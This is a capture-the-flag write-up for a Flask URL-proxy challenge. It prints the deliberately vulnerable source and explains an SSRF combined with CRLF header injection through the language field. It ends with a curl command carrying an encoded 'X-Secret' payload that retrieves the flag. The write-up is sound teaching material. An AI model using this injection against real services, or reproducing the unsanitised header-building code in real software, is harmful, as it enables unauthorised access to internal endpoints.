# Gynvael Coldwind ExpressJS challenge 1

Source: https://twitter.com/gynvael/status/1256352469795430407

## Challenge

The challenge is a page with a form that contains two inputs - `URL` and `Language code` and exposes the following source code:
```python
#!/usr/bin/python3
from flask import Flask, request, Response, render_template_string
from urllib.parse import urlparse
import socket
import os

app = Flask(__name__)
FLAG = os.environ.get('FLAG', "???")

with open("task.py") as f:
  SOURCE = f.read()

@app.route('/secret')
def secret():
  if request.remote_addr != "127.0.0.1":
    return "Access denied!"

  if request.headers.get("X-Secret", "") != "YEAH":
    return "Nope."

  return f"GOOD WORK! Flag is {FLAG}"

@app.route('/')
def index():
  return render_template_string(
      """
      <html>
        <body>
          <h1>URL proxy with language preference!</h1>
          <form action="/fetch" method="POST">
            <p>URL: <input name="url" value="http://gynvael.coldwind.pl/"></p>
            <p>Language code: <input name="lang" value="en-US"></p>
            <p><input type="submit"></p>
          </form>
          <pre>
Task source:
{{ src }}
          </pre>
        </body>
      </html>
      """, src=SOURCE)

@app.route('/fetch', methods=["POST"])
def fetch():
  url = request.form.get("url", "")
  lang = request.form.get("lang", "en-US")

  if not url:
    return "URL must be provided"

  data = fetch_url(url, lang)
  if data is None:
    return "Failed."

  return Response(data, mimetype="text/plain;charset=utf-8")

def fetch_url(url, lang):
  o = urlparse(url)

  req = '\r\n'.join([
    f"GET {o.path} HTTP/1.1",
    f"Host: {o.netloc}",
    f"Connection: close",
    f"Accept-Language: {lang}",
    "",
    ""
  ])

  res = o.netloc.split(':')
  if len(res) == 1:
    host = res[0]
    port = 80
  else:
    host = res[0]
    port = int(res[1])

  data = b""
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(req.encode('utf-8'))
    while True:
      data_part = s.recv(1024)
      if not data_part:
        break
      data += data_part

  return data

if __name__ == "__main__":
  app.run(debug=False, host="0.0.0.0")
```

## Analysis

Function `fetch` sends a request on behalf of the web service towards specified `URL` and adds the `Language code` into the `Accept-Language` HTTP header. This points to a possible Server side request forgery (SSRF). 

Checking the `secret` function, we can see that it is mapped to `/secret` and contains two checks:
- `request.remote_addr != "127.0.0.1"`
- `request.headers.get("X-Secret", "") != "YEAH"`

The first condition is easily bypassed since we can specify `127.0.0.1` in the `URL`. The second condition checks if there is an HTTP header `X-Secret` present and contains the value `YEAH`. The ability to inject the `X-Secret` header is related with `fetch_url` function.

The `fetch_url` contains the following:
```python
req = '\r\n'.join([
    f"GET {o.path} HTTP/1.1",
    f"Host: {o.netloc}",
    f"Connection: close",
    f"Accept-Language: {lang}",
    "",
    ""
])
```

Our `Language code` input will be specified as `Accept-Language` HTTP header. Great. What if we specify our own `\r\n` in the `Language code` input?

Let's check this with python3:
```python
>>> lang = 'en-US\r\nX-Secret: YEAH'
>>> req = '\r\n'.join([
... f"GET / HTTP/1.1",
... f"Accept-Language: {lang}",
... ""
... ])
>>> req
'GET / HTTP/1.1\r\nAccept-Language: en-US\r\nX-Secret: YEAH\r\n'
>>> print(req)
GET / HTTP/1.1
Accept-Language: en-US
X-Secret: YEAH

>>> 
```

Looks good. In order to successfully get the flag, we will have to send a `Language code` that contains `\r\n` by encoding them. This can be easily done with `curl`.

## Solution

To solve the challenge specify the `URL` as `http://127.0.0.1:5000` and `Language code` as `en-US\r\nX-Secret: YEAH\r\n` in your POST request to `/fetch`.

```sh
$ curl -d 'url=http%3A%2F%2F127.0.0.1%3A5000%2Fsecret&lang=en-US%0D%0AX-Secret%3A%20YEAH%0D%0A' http://35.204.139.205:5000/fetch
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 42
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 13 May 2020 14:47:25 GMT

GOOD WORK! Flag is CTF{ThesePeskyNewLines}
```
